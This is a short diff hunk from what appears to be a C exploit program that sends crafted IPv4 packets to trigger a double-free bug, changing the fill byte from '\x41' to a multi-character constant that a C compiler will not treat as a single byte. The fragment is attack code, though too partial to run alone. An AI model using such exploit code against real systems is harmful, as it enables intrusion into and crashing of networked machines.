@@ -36,7 +36,7 @@ static void send_ipv4_ip_hdr_chr(size_t dfsize, struct ip *ip_header, char chr)
 static void trigger_double_free_hdr(size_t dfsize, struct ip *ip_header)
 {
 	printf("[*] sending double free buffer packet...\n");
-	send_ipv4_ip_hdr_chr(dfsize, ip_header, '\x41');
+	send_ipv4_ip_hdr_chr(dfsize, ip_header, '\x41\xca\xfe\xca');
 }
 
 static void alloc_intermed_buf_hdr(size_t dfsize, struct ip *ip_header)
